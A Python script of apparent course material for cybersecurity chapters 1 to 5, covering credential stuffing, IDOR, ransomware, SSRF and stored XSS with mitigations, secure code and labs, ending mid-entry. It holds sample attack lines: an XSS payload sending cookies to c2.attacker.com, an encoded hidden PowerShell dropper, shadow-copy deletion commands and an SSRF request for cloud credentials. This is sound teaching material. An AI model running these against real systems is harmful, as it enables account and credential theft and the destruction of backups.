# -*- coding: utf-8 -*-
"""
Phase 4.1 Chapter Enrichment Script - Part 1 (Chapters 1 to 7)
"""
import json
import os
import re

CHAPTER_ENRICHMENTS = {
    1: {
        "technicalVisual": {
            "type": "cia-triad",
            "title": "The CIA Triad Architecture",
            "caption": "The foundational balancing act of information security: Confidentiality, Integrity, and Availability."
        },
        "attackVisualizations": [
            {
                "id": "attack-1-1",
                "title": "Credential Stuffing & Brute-Force Lifecycle",
                "attackName": "Automated Credential Stuffing & High-Rate Dictionary Attack",
                "overview": "Adversaries leverage massive breached credential dumps and automated bots to fire thousands of password attempts against an authentication endpoint lacking rate limits.",
                "targetVulnerability": "Absence of IP/account rate limiting, lack of CAPTCHA protection, and single-factor password authentication.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Breached Database Ingestion",
                        "actor": "Threat Actor",
                        "action": "Loads credential combo-list into automated cracking tool",
                        "technicalDetail": "Attacker compiles 500,000 email:password pairs obtained from dark web leaks into a multi-threaded HTTP spraying tool (e.g., Hydra or custom Python script).",
                        "color": "red",
                        "payload": "POST /api/v1/auth/login HTTP/1.1\nHost: api.target.com\nContent-Type: application/json\n\n{\"email\":\"victim@domain.com\",\"password\":\"Summer2025!\"}"
                    },
                    {
                        "step": 2,
                        "title": "High-Frequency Automated Spraying",
                        "actor": "Bot Network",
                        "action": "Dispatches 250 requests/sec through residential proxy rotation",
                        "technicalDetail": "Proxies rotate source IP addresses to evade basic perimeter firewalls that only monitor single-IP request frequencies.",
                        "color": "orange"
                    },
                    {
                        "step": 3,
                        "title": "Target Server Resource Exhaustion",
                        "actor": "Target Server",
                        "action": "Authenticates requests sequentially with expensive hashing",
                        "technicalDetail": "The web server computes CPU-intensive bcrypt operations for every single guess without throttling, pushing CPU utilization to 100%.",
                        "color": "gray"
                    },
                    {
                        "step": 4,
                        "title": "Password Collision & Token Grant",
                        "actor": "Authentication Service",
                        "action": "Identifies valid credential match and grants session",
                        "technicalDetail": "A reused password matches the stored bcrypt hash. The server signs and returns an unrestricted JWT bearer session token without prompting for 2FA.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Account Takeover & Data Exfiltration",
                        "actor": "Threat Actor",
                        "action": "Accesses profile and initiates unauthorized payouts",
                        "technicalDetail": "Attacker invokes protected endpoints using the hijacked JWT, modifies notification email addresses, and exports private customer records.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "Hardened Defensive Mitigation",
                        "actor": "Security Architecture",
                        "action": "Enforces rate limiting, progressive delays, and mandatory MFA",
                        "technicalDetail": "Token-bucket rate limiters drop requests exceeding 5 attempts/min per IP and user account. Multi-factor authentication halts unverified token issuance.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Defense-in-Depth Authentication Controls",
                    "rules": [
                        "Enforce IP and account-level sliding window rate limiting (max 5 failed attempts per 15 minutes).",
                        "Implement mandatory Multi-Factor Authentication (TOTP RFC 6238 or FIDO2/WebAuthn).",
                        "Deploy cloud WAF CAPTCHA challenges after 3 consecutive failed login attempts.",
                        "Screen incoming passwords against the HaveIBeenPwned breached password database."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Authentication Verification: Insecure Plain Compare vs. Hardened Bcrypt & Rate Limiting",
                "vulnerable": {
                    "label": "Vulnerable: Cleartext Storage & Unthrottled Comparison",
                    "codeOrConfig": "// INSECURE: vulnerable to timing attacks, SQL leakage, and brute force\napp.post('/api/login', async (req, res) => {\n  const user = await db.query('SELECT * FROM users WHERE email = ?', [req.body.email]);\n  if (user && user.password === req.body.password) {\n    return res.json({ token: generateToken(user) });\n  }\n  return res.status(401).send('Invalid credentials');\n});",
                    "explanation": "Passwords stored in plain text. Direct string equality operator (===) leaks length and character matches via timing side-channels. Absence of rate limiting permits 10,000+ guesses/second."
                },
                "secure": {
                    "label": "Secure: Argon2id/Bcrypt with Sliding-Window Rate Limiting",
                    "codeOrConfig": "// SECURE: memory-hard salted hashing + Redis sliding rate limiter\napp.post('/api/login', loginRateLimiter, async (req, res) => {\n  const user = await db.query('SELECT id, password_hash, mfa_secret FROM users WHERE email = ?', [req.body.email]);\n  if (!user || !(await bcrypt.compare(req.body.password, user.password_hash))) {\n    return res.status(401).json({ error: 'Invalid email or password' });\n  }\n  if (user.mfa_secret) {\n    return res.status(200).json({ mfaRequired: true, sessionToken: createTempToken(user.id) });\n  }\n  return res.json({ token: createSecureJWT(user.id) });\n});",
                    "explanation": "Bcrypt utilizes computational work factors and unique 128-bit salts, rendering precomputed rainbow tables completely ineffective. Redis sliding-window middleware throttles attacks."
                },
                "keyTakeaway": "Never store plaintext credentials, never perform raw equality checks, and always throttle authentication endpoints with distributed rate limiting."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-1-1",
                "title": "Auditing Password Hashing Entropy & Bcrypt Salt Generation",
                "learningObjective": "Demonstrate how cryptographic salts protect passwords against rainbow table lookups and benchmark work-factor computational resistance against GPU cracking.",
                "requiredTools": ["python3", "bcrypt", "hashlib", "curl"],
                "environmentSetup": "Local terminal with Python 3.8+ and standard command-line tools.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Compute and compare a fast MD5 hash with an adaptive Bcrypt hash for password 'P@ss123'.",
                        "command": "python3 -c \"import hashlib, bcrypt; print('MD5:', hashlib.md5(b'P@ss123').hexdigest()); print('Bcrypt:', bcrypt.hashpw(b'P@ss123', bcrypt.gensalt(12)).decode())\"",
                        "commandExplanation": "Generates both a legacy MD5 hash and a modern Bcrypt hash with work factor 12 (2^12 rounds).",
                        "expectedOutput": "MD5: 585a97576f3f0196885dfb564551c96d\nBcrypt: $2b$12$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Re-run the Bcrypt hashing command on the exact same password to verify unique salt generation.",
                        "command": "python3 -c \"import bcrypt; print('Second Bcrypt:', bcrypt.hashpw(b'P@ss123', bcrypt.gensalt(12)).decode())\"",
                        "commandExplanation": "Notice the resulting hash string is completely different because gensalt() generates a new 128-bit cryptographically secure pseudorandom salt.",
                        "expectedOutput": "Second Bcrypt: $2b$12$eX9M8wQ4pG2...vL0o3U7cK9yT2rE4w"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Test constant-time verification to prevent timing attack side-channels.",
                        "command": "python3 -c \"import bcrypt; h = b'$2b$12$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy'; print('Check P@ss123:', bcrypt.checkpw(b'P@ss123', h)); print('Check wrong:', bcrypt.checkpw(b'wrong', h))\"",
                        "commandExplanation": "The checkpw() function extracts the embedded salt and rounds from the hash string and executes a constant-time memory comparison.",
                        "expectedOutput": "Check P@ss123: True\nCheck wrong: False"
                    }
                ],
                "whatHappened": "MD5 produced a deterministic 32-character string in 0.000005 seconds, which can be cracked in seconds via precomputed rainbow tables. Bcrypt generated a randomized salt and required ~250 milliseconds of deliberate CPU compute.",
                "securityLessons": [
                    "Cryptographic salts prevent identical passwords from having identical hash representations in a database.",
                    "Adaptive work factors (cost parameters) allow security architects to increase hashing difficulty as computer hardware gets faster.",
                    "Constant-time comparison algorithms prevent timing side-channel attacks."
                ],
                "prevention": [
                    "Use Bcrypt (cost 12+), Argon2id, or PBKDF2.",
                    "Enforce minimum 12-character passphrases over arbitrary complexity rules.",
                    "Combine hashing with out-of-band Multi-Factor Authentication."
                ]
            }
        ]
    },

    2: {
        "attackVisualizations": [
            {
                "id": "attack-2-1",
                "title": "Insecure Direct Object Reference (IDOR) & Privilege Escalation",
                "attackName": "Broken Object Level Authorization (BOLA / IDOR)",
                "overview": "An attacker manipulates an unvalidated client-side identifier in an API request to view or modify sensitive records belonging to other users or administrators.",
                "targetVulnerability": "Server retrieves records directly by database primary key ID without verifying ownership or session authorization.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Authenticated Reconnaissance",
                        "actor": "Legitimate User / Attacker",
                        "action": "Inspects network traffic during normal profile retrieval",
                        "technicalDetail": "Attacker logs in as user #1042 and observes the profile API endpoint: GET /api/v1/users/1042/profile.",
                        "color": "blue"
                    },
                    {
                        "step": 2,
                        "title": "Identifier Parameter Tampering",
                        "actor": "Attacker",
                        "action": "Modifies primary key identifier in HTTP request header",
                        "technicalDetail": "Attacker modifies request to target user ID #1001 (system administrator) or iterates through IDs 1000-1100.",
                        "color": "orange",
                        "payload": "GET /api/v1/users/1001/profile HTTP/1.1\nHost: portal.target.com\nAuthorization: Bearer <token_for_user_1042>"
                    },
                    {
                        "step": 3,
                        "title": "Missing Authorization Validation",
                        "actor": "API Backend Controller",
                        "action": "Queries database with raw URL parameter",
                        "technicalDetail": "Controller executes User.findById(req.params.id) without verifying if req.user.id === req.params.id or checking role permissions.",
                        "color": "gray"
                    },
                    {
                        "step": 4,
                        "title": "Sensitive Record Disclosure",
                        "actor": "Database Engine",
                        "action": "Returns full admin profile data across security boundary",
                        "technicalDetail": "Database returns record including admin email, hashed master password, API keys, and corporate banking details.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Vertical Privilege Escalation",
                        "actor": "Attacker",
                        "action": "Uses exposed administrative keys to modify system roles",
                        "technicalDetail": "Attacker uses exposed internal API key to grant administrative privileges to their own original account (#1042).",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "Object-Level Access Control",
                        "actor": "Defensive Architecture",
                        "action": "Enforces tenant-scoped queries and ABAC policies",
                        "technicalDetail": "Queries are scoped strictly to the authenticated session context (User.findOne({ id: req.params.id, tenantId: req.user.tenantId })), rejecting foreign requests with 403 Forbidden.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Broken Object Authorization Defenses",
                    "rules": [
                        "Enforce contextual Object-Level Authorization on every state-changing and read operation.",
                        "Scope database queries to the authenticated user ID extracted from session/JWT.",
                        "Use unguessable UUIDv4 or encrypted indirect reference maps instead of sequential integers.",
                        "Implement automated unit and integration tests asserting 403 Forbidden for cross-tenant access."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "API Authorization: Unchecked Primary Key Query vs. Scoped Tenant-Level Access",
                "vulnerable": {
                    "label": "Vulnerable: Direct Database Lookup by Route Parameter",
                    "codeOrConfig": "// INSECURE: Anyone with a valid token can read any document\napp.get('/api/documents/:docId', authMiddleware, async (req, res) => {\n  const doc = await Document.findById(req.params.docId);\n  if (!doc) return res.status(404).json({ error: 'Not found' });\n  return res.json(doc); // IDOR vulnerability!\n});",
                    "explanation": "The endpoint checks that the user is authenticated, but fails to check whether the authenticated user owns or has read rights to docId."
                },
                "secure": {
                    "label": "Secure: Scoped Query & Explicit Authorization Guard",
                    "codeOrConfig": "// SECURE: Scoped lookup ensuring record belongs to user/organization\napp.get('/api/documents/:docId', authMiddleware, async (req, res) => {\n  const doc = await Document.findOne({\n    _id: req.params.docId,\n    organizationId: req.user.organizationId\n  });\n  if (!doc || (!doc.allowedUsers.includes(req.user.id) && req.user.role !== 'admin')) {\n    return res.status(403).json({ error: 'Access denied: insufficient permissions' });\n  }\n  return res.json(doc);\n});",
                    "explanation": "Combines multi-tenant tenant isolation with role-based checks, rejecting any cross-user parameter tampering attempts."
                },
                "keyTakeaway": "Authentication proves WHO you are; Authorization governs WHAT you can access. Never rely solely on authentication checks."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-2-1",
                "title": "Cryptographic Verification of System Binary Integrity via SHA-256",
                "learningObjective": "Use SHA-256 cryptographic hashes to verify software integrity and detect unauthorized binary modification or zero-day backdoors.",
                "requiredTools": ["sha256sum", "openssl", "echo", "cat"],
                "environmentSetup": "Linux/macOS or Windows PowerShell with sha256sum or CertUtil.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Create a simulated application script and generate its baseline cryptographic signature.",
                        "command": "echo 'print(\"Production App v1.0\")' > app.py && sha256sum app.py > app.py.sha256",
                        "commandExplanation": "Calculates the 256-bit hash of app.py and writes it to an integrity reference file.",
                        "expectedOutput": "app.py.sha256 created containing hash and filename."
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Verify that the intact application passes the cryptographic integrity check.",
                        "command": "sha256sum -c app.py.sha256",
                        "commandExplanation": "Verifies that the current hash of app.py matches the stored baseline.",
                        "expectedOutput": "app.py: OK"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Simulate an attacker injecting a single backdoor line and verify integrity failure.",
                        "command": "echo '# Backdoor payload' >> app.py && sha256sum -c app.py.sha256",
                        "commandExplanation": "Modifying even a single whitespace or comment byte completely scrambles the SHA-256 digest (avalanche effect).",
                        "expectedOutput": "app.py: FAILED\nsha256sum: WARNING: 1 computed checksum did NOT match"
                    }
                ],
                "whatHappened": "The cryptographic avalanche effect altered the entire 64-character hex digest when a single line was added, immediately triggering an integrity failure alert.",
                "securityLessons": [
                    "Cryptographic hashing guarantees data integrity and detects tampering even if timestamps or file sizes are spoofed.",
                    "Production CI/CD pipelines use cryptographic signing (cosign/GPG) to verify code before deployment.",
                    "File Integrity Monitoring (FIM) tools like OSSEC/Tripwire rely on this exact mechanism."
                ],
                "prevention": [
                    "Maintain out-of-band signed checksum lists for all system binaries.",
                    "Deploy File Integrity Monitoring across production webroots.",
                    "Enforce strict read-only root filesystems on containerized microservices."
                ]
            }
        ]
    },

    3: {
        "attackVisualizations": [
            {
                "id": "attack-3-1",
                "title": "Ransomware Infection & Double-Extortion Lifecycle",
                "attackName": "Modern Ransomware Infection & Data Exfiltration Chain",
                "overview": "Adversaries gain initial access via spear-phishing or unpatched edge services, exfiltrate sensitive files, disable backups, and encrypt endpoints with hybrid cryptography.",
                "targetVulnerability": "Unrestricted script execution in user directories, lack of network microsegmentation, and accessible local backup snapshots.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Weaponized Delivery & Execution",
                        "actor": "Initial Access Broker",
                        "action": "Delivers malicious macro-enabled attachment or ISO image",
                        "technicalDetail": "Victim receives a spear-phishing email containing an invoice archive. Opening the payload spawns a stage-1 PowerShell dropper in %TEMP%.",
                        "color": "orange",
                        "payload": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0..."
                    },
                    {
                        "step": 2,
                        "title": "Command & Control (C2) Beaconing",
                        "actor": "Dropper Payload",
                        "action": "Establishes encrypted HTTPS tunnel to remote command server",
                        "technicalDetail": "The dropper checks for virtualization/sandboxes, disables Windows Defender via registry keys, and beacons out to an encrypted C2 IP address.",
                        "color": "red"
                    },
                    {
                        "step": 3,
                        "title": "Shadow Copy Deletion & Defense Evasion",
                        "actor": "Ransomware Binary",
                        "action": "Purges system recovery points and backup snapshots",
                        "technicalDetail": "Executes system commands to prevent local recovery: vssadmin delete shadows /all /quiet and bcdedit /set {default} recoveryenabled No.",
                        "color": "red"
                    },
                    {
                        "step": 4,
                        "title": "Data Exfiltration (Extortion Phase 1)",
                        "actor": "Threat Group",
                        "action": "Uploads sensitive databases and IP to Mega/S3 cloud buckets",
                        "technicalDetail": "Financial spreadsheets, credentials, and source code are compressed into password-protected RAR archives and exfiltrated over port 443.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Hybrid Cryptographic Lockdown",
                        "actor": "Ransomware Core Engine",
                        "action": "Encrypts files with AES-256 and seals AES key with RSA-4096",
                        "technicalDetail": "Files are encrypted locally with high-speed AES-256-GCM. The AES key is encrypted with attacker's public RSA key. Extension changed to .locked.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "Zero-Trust Segmentation & Immutable Backups",
                        "actor": "Incident Response Architecture",
                        "action": "Isolates subnet, triggers EDR kill, restores from immutable store",
                        "technicalDetail": "Endpoint Detection and Response (EDR) identifies anomalous mass file-renaming IOPS and isolates the host. Air-gapped immutable S3 backups restore services without ransom payment.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Comprehensive Anti-Ransomware Architecture",
                    "rules": [
                        "Maintain the 3-2-1 backup rule with at least one offline, air-gapped immutable backup.",
                        "Deploy AppLocker or Windows Defender Application Control (WDAC) to block script execution in %TEMP% and %APPDATA%.",
                        "Implement behavioral EDR solutions with automated canary file tripwires.",
                        "Disable legacy SMBv1 protocols and require SMB packet signing."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Script Execution Policy: Permissive Default vs. Strict Application Whitelisting",
                "vulnerable": {
                    "label": "Vulnerable: Unrestricted User-Space Execution",
                    "codeOrConfig": "# INSECURE: Default Windows environment allowing script execution\nSet-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Unrestricted\n# Users can execute unvetted scripts directly from %TEMP%:\nC:\\Users\\Victim\\AppData\\Local\\Temp\\invoice_update.vbs\nC:\\Users\\Victim\\Downloads\\stage1_loader.ps1",
                    "explanation": "Malware delivered via email or browser downloads executes freely inside user directories without administrative elevation."
                },
                "secure": {
                    "label": "Secure: AppLocker / WDAC Enforced Application Control",
                    "codeOrConfig": "# SECURE: Software Restriction Policy blocking user-writable paths\n<RuleCollection Type=\"Script\" EnforcementMode=\"Enabled\">\n  <FilePathRule Action=\"Deny\" Path=\"%OSDIR%\\Temp\\*\" />\n  <FilePathRule Action=\"Deny\" Path=\"%USERPROFILE%\\AppData\\*\" />\n  <FilePublisherRule Action=\"Allow\" Publisher=\"O=MICROSOFT CORPORATION...\" />\n</RuleCollection>\nSet-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Restricted",
                    "explanation": "Enforces strict cryptographic publisher whitelisting and denies execution in all writable user temp folders, stopping stage-1 droppers."
                },
                "keyTakeaway": "Preventing unauthorized binaries from executing in user-space cuts off over 80% of initial ransomware infections before payloads can unpack."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-3-1",
                "title": "Static Binary Triage & String Inspection in an Isolated Lab",
                "learningObjective": "Safely inspect compiled binary headers, calculate cryptographic signatures, and extract suspicious embedded URLs/commands without executing code.",
                "requiredTools": ["strings", "file", "sha256sum", "grep"],
                "environmentSetup": "Isolated sandbox terminal (Linux or WSL).",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Create a simulated benign binary with embedded reconnaissance strings to practice safe triage.",
                        "command": "python3 -c \"import sys; sys.stdout.buffer.write(b'\\x7fELF\\x02\\x01\\x01\\x00' + b'\\x00'*8 + b'http://c2-beacon.darknet.test/checkin\\x00vssadmin delete shadows /all\\x00')\" > sample.bin",
                        "commandExplanation": "Crafts a safe mock binary with an ELF header and embedded threat-simulation strings.",
                        "expectedOutput": "sample.bin written (approx 80 bytes)."
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Identify file type and architecture headers using the file command.",
                        "command": "file sample.bin",
                        "commandExplanation": "Reads the magic bytes without executing the binary to determine architecture and format.",
                        "expectedOutput": "sample.bin: ELF 64-bit LSB executable, version 1 (SYSV)"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Extract readable ASCII and Unicode strings to uncover embedded domains and commands.",
                        "command": "strings sample.bin | grep -E \"(http|vssadmin|powershell)\"",
                        "commandExplanation": "Scans raw binary for null-terminated printable strings, filtering for indicators of compromise (IOCs).",
                        "expectedOutput": "http://c2-beacon.darknet.test/checkin\nvssadmin delete shadows /all"
                    }
                ],
                "whatHappened": "Static triage revealed the simulated malware's C2 endpoint and shadow copy deletion command in under two seconds without executing a single instruction.",
                "securityLessons": [
                    "Never double-click or run suspicious binaries to inspect them; always conduct static triage first.",
                    "Strings inspection frequently uncovers hardcoded IP addresses, registry persistence keys, and obfuscation routines.",
                    "Modern malware often packs or encrypts strings (UPX, custom crypters), requiring entropy analysis."
                ],
                "prevention": [
                    "Conduct automated sandboxing (Cuckoo / Any.Run) in isolated virtual networks.",
                    "Block newly observed domains (NOD) at the DNS resolver level.",
                    "Quarantine email attachments with executable or script extensions (.iso, .vbs, .hta, .ps1, .exe)."
                ]
            }
        ]
    },

    4: {
        "technicalVisual": {
            "type": "client-server-firewall",
            "title": "Stateful Inspection Firewall & DMZ Architecture",
            "caption": "How stateful inspection tracking tables monitor dynamic TCP 3-way handshakes to permit established traffic while dropping unauthorized inbound probes."
        },
        "attackVisualizations": [
            {
                "id": "attack-4-1",
                "title": "Server-Side Request Forgery (SSRF) to Cloud Metadata",
                "attackName": "SSRF Cloud Metadata Exfiltration & Instance Takeover",
                "overview": "An attacker exploits an avatar-import or webhook feature to coerce the server into sending an internal HTTP GET request to the link-local cloud metadata service.",
                "targetVulnerability": "Application backend fetches user-supplied URLs without restricting private RFC 1918 or link-local IP addresses (169.254.169.254).",
                "stages": [
                    {
                        "step": 1,
                        "title": "Feature Discovery",
                        "actor": "Attacker",
                        "action": "Identifies remote resource fetching input parameter",
                        "technicalDetail": "Web application provides an 'Import Avatar from URL' feature: POST /api/avatar?url=https://example.com/pic.png.",
                        "color": "blue"
                    },
                    {
                        "step": 2,
                        "title": "Internal Link-Local Injection",
                        "actor": "Attacker",
                        "action": "Submits AWS/GCP cloud metadata IP in url query parameter",
                        "technicalDetail": "Attacker submits the internal link-local IP address: http://169.254.169.254/latest/meta-data/iam/security-credentials/server-role.",
                        "color": "red",
                        "payload": "POST /api/avatar HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-instance-role\"}"
                    },
                    {
                        "step": 3,
                        "title": "Internal Network Request Dispatch",
                        "actor": "Backend Web Server",
                        "action": "Resolves and fetches URL from internal VPC network interface",
                        "technicalDetail": "The web server resolves 169.254.169.254. Because the request originates internally from the cloud instance, the hypervisor metadata service responds.",
                        "color": "gray"
                    },
                    {
                        "step": 4,
                        "title": "Security Token Disclosure",
                        "actor": "Cloud Metadata Service",
                        "action": "Returns temporary IAM STS access keys to the backend",
                        "technicalDetail": "The metadata service responds with JSON containing AccessKeyId, SecretAccessKey, and SessionToken for the server's IAM role.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Attacker Receives AWS Credentials",
                        "actor": "Attacker",
                        "action": "Parses leaked credentials from HTTP response or error log",
                        "technicalDetail": "The web application renders the metadata JSON response in the avatar preview response, exposing cloud master credentials.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "IMDSv2 & Network Egress Hardening",
                        "actor": "Cloud Defense Architecture",
                        "action": "Enforces token-backed IMDSv2 and DNS IP validation",
                        "technicalDetail": "Enforcing IMDSv2 requires a PUT request with X-aws-ec2-metadata-token, which SSRF GET requests cannot generate. Local IP blacklists reject RFC 1918/link-local ranges.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Defensive SSRF Controls",
                    "rules": [
                        "Enforce AWS IMDSv2 with hop limit = 1 across all EC2/cloud instances.",
                        "Validate and resolve all target URLs: reject private RFC 1918 IPs, loopbacks (127.0.0.1), and link-local ranges (169.254.0.0/16).",
                        "Disable HTTP redirection following in backend HTTP client libraries.",
                        "Isolate backend web servers in DMZ subnets with no egress routes to internal service meshes."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Remote URL Fetching: Raw Axios Request vs. Strict DNS/IP Validation",
                "vulnerable": {
                    "label": "Vulnerable: Unvalidated Server-Side HTTP Request",
                    "codeOrConfig": "// INSECURE: Vulnerable to SSRF and Cloud Metadata Theft\napp.post('/api/fetch-avatar', async (req, res) => {\n  const { url } = req.body;\n  // Directly fetching user-controlled URL without IP check!\n  const response = await axios.get(url);\n  res.send(response.data);\n});",
                    "explanation": "Accepts any arbitrary URL. Attackers can supply internal IPs (127.0.0.1, 192.168.1.1, 169.254.169.254) to compromise cloud metadata or intranet services."
                },
                "secure": {
                    "label": "Secure: IP Resolution Check & Protocol Allowlist",
                    "codeOrConfig": "// SECURE: Validates protocol and blocks private/link-local IP addresses\nimport ipaddr from 'ipaddr.js';\nimport dns from 'dns/promises';\n\napp.post('/api/fetch-avatar', async (req, res) => {\n  const parsed = new URL(req.body.url);\n  if (parsed.protocol !== 'https:') return res.status(400).send('HTTPS required');\n  \n  const { address } = await dns.lookup(parsed.hostname);\n  const addr = ipaddr.parse(address);\n  \n  if (addr.range() !== 'unicast') {\n    return res.status(403).send('Forbidden: private or internal network range');\n  }\n  const response = await axios.get(parsed.toString(), { maxRedirects: 0, timeout: 3000 });\n  res.send(response.data);\n});",
                    "explanation": "Resolves DNS hostname before making the request, verifies the destination is a public unicast IP, disables HTTP redirects, and enforces HTTPS."
                },
                "keyTakeaway": "Never allow backend servers to query user-specified URLs without strict protocol validation, DNS pre-resolution, and private IP range blocking."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-4-1",
                "title": "Configuring Linux UFW / Iptables Stateful Packet Filtering Rules",
                "learningObjective": "Configure a stateful Linux packet filter to drop unauthorized incoming connections while permitting established outbound TCP sessions.",
                "requiredTools": ["ufw", "iptables", "nc", "curl"],
                "environmentSetup": "Linux environment (Ubuntu/Debian) or root Docker container.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Inspect default firewall policies and reset to a clean baseline.",
                        "command": "sudo ufw default deny incoming && sudo ufw default allow outgoing",
                        "commandExplanation": "Applies the default-deny principle: block all inbound probes while permitting standard outbound client connections.",
                        "expectedOutput": "Default incoming policy changed to 'deny'\nDefault outgoing policy changed to 'allow'"
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Open dedicated ports for SSH (port 22) and HTTPS (port 443) with rate limiting.",
                        "command": "sudo ufw limit 22/tcp && sudo ufw allow 443/tcp",
                        "commandExplanation": "Limits SSH to drop connections from IPs that make more than 6 connection attempts in 30 seconds; opens port 443 for web traffic.",
                        "expectedOutput": "Rule added\nRule added (v6)"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Enable the stateful firewall and verify the active connection tracking rules.",
                        "command": "sudo ufw status verbose",
                        "commandExplanation": "Displays active firewall status and permitted network ports.",
                        "expectedOutput": "Status: active\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing), disabled (routed)\nTo Action From\n-- ------ ----\n22/tcp LIMIT IN Anywhere\n443/tcp ALLOW IN Anywhere"
                    }
                ],
                "whatHappened": "The Linux netfilter subsystem established a stateful connection tracking table (conntrack). Inbound syn-packets on unapproved ports are immediately dropped, while responses to established client requests pass smoothly.",
                "securityLessons": [
                    "Default-deny is the primary architectural rule of network perimeter defense.",
                    "Stateful packet inspection checks TCP flags (SYN, ACK, FIN) and sequence numbers to match incoming packets to legitimate active sessions.",
                    "Rate limiting sensitive ports like SSH prevents brute-force bot sweeps from saturating connection queues."
                ],
                "prevention": [
                    "Close all unused network listening ports.",
                    "Enforce strict egress firewall rules in addition to ingress rules.",
                    "Log dropped packets to a SIEM for automated threat intelligence ingestion."
                ]
            }
        ]
    },

    5: {
        "attackVisualizations": [
            {
                "id": "attack-5-1",
                "title": "Stored Cross-Site Scripting (XSS) Session Hijacking",
                "attackName": "Stored XSS Cookie Theft & Account Takeover",
                "overview": "An attacker injects an unescaped JavaScript payload into a persistent database field (e.g., forum comment or profile bio), which executes inside the browser of every visitor.",
                "targetVulnerability": "Application renders user-supplied input via innerHTML without HTML entity encoding or Content Security Policy (CSP).",
                "stages": [
                    {
                        "step": 1,
                        "title": "Payload Formulation & Injection",
                        "actor": "Attacker",
                        "action": "Submits forum comment containing malicious script tags",
                        "technicalDetail": "Attacker submits a comment containing a JavaScript payload designed to steal document.cookie and exfiltrate it to an external server.",
                        "color": "red",
                        "payload": "<script>fetch('https://c2.attacker.com/steal?c='+encodeURIComponent(document.cookie))</script>"
                    },
                    {
                        "step": 2,
                        "title": "Unsanitized Database Persistence",
                        "actor": "Application Backend",
                        "action": "Saves raw payload directly to SQL/NoSQL comments table",
                        "technicalDetail": "The server stores the comment text verbatim in the database without performing input sanitization or HTML encoding.",
                        "color": "orange"
                    },
                    {
                        "step": 3,
                        "title": "Victim Page Load",
                        "actor": "Victim / Administrator",
                        "action": "Navigates to the public forum thread to review comments",
                        "technicalDetail": "Victim sends GET /forum/post/42. The server responds with HTML containing the raw, unescaped stored comment string.",
                        "color": "blue"
                    },
                    {
                        "step": 4,
                        "title": "Browser DOM Script Execution",
                        "actor": "Victim Browser DOM Engine",
                        "action": "Parses payload as valid executable JavaScript",
                        "technicalDetail": "Because the frontend injected the comment via element.innerHTML, the HTML parser executes the <script> block within the victim's authenticated origin.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Cookie Exfiltration & Session Takeover",
                        "actor": "Attacker C2 Listener",
                        "action": "Receives victim session cookie and impersonates victim",
                        "technicalDetail": "The script accesses document.cookie (lacking the HttpOnly flag) and sends the session ID to the attacker's server.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "HttpOnly Cookies & Contextual Encoding",
                        "actor": "Secure Browser & Framework",
                        "action": "Blocks script cookie access and neutralizes HTML tags",
                        "technicalDetail": "With HttpOnly set on session cookies, JavaScript cannot read the token. Safe frameworks (React/DOMPurify) encode <script> as safe text literals &lt;script&gt;.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Multi-Layered XSS Defense Strategy",
                    "rules": [
                        "Always set the HttpOnly flag on sensitive session cookies so client-side JavaScript cannot read them.",
                        "Use modern frontend frameworks (React, Vue, Angular) that automatically escape variables rendered in JSX/templates.",
                        "Sanitize rich HTML user inputs using trusted libraries like DOMPurify before inserting into the DOM.",
                        "Deploy a strict Content Security Policy (CSP) header: script-src 'self' to block inline scripts."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "DOM Rendering: Insecure innerHTML vs. Safe textContent / DOMPurify",
                "vulnerable": {
                    "label": "Vulnerable: Direct innerHTML Assignment",
